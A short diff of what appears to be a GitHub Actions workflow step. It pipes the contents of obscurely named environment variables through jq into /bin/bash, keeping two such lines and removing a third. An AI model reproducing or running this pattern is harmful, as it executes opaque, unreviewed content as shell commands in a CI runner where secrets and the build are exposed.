@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$tpq9" | jq -r .kyxp5628 | /bin/bash
           echo $luqx005 | jq -r .ncwiu28294 | /bin/bash
-          echo $lobr62 | jq -r .hknr4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
